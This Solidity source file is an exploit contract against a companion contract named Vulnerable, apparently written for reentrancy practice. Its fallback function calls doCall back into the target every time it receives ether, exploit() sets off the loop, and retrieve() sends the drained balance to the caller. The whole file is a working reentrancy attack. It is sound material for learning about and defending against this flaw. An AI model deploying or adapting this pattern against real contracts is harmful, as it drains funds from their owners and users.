// SPDX-License-Identifier: MIT
pragma solidity >0.8.10 <0.9.0;

//This contract will be taking the interface of the Vulnerable contract and interacting with it.
//This doesn't require the interface and can be done with the base contract as well.
//Here, we will call the doCall function in vulnerable contract within our fallback function


import {Vulnerable } from "./Vulnerable.sol";

contract Exploit {

    Vulnerable public vC;
    //Doesn't really need to be public, but we can use it to ensure we have connected to the right contract

    constructor (address payable _VulCon) {
        vC = Vulnerable(_VulCon);
    }
//Sets the address of contract to our variable (from which we will now call the contract's functions


//////////////////////////////////          Main Exploit                ///////////////////////////////////////////////////

    fallback() external payable { 
        vC.doCall(payable(address(this)));
    }

    function exploit() public {
        vC.doCall(payable(address(this)));
    }


//////////////////////////////////          Main Exploit                ///////////////////////////////////////////////////


	//These 2 functions aren't required for exploit to be successful, but added for completeness purpose.
    
    receive() external payable { }

    function showBalanceThis() public view returns(uint){
        return address(this).balance;
    }

    function retrieve() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}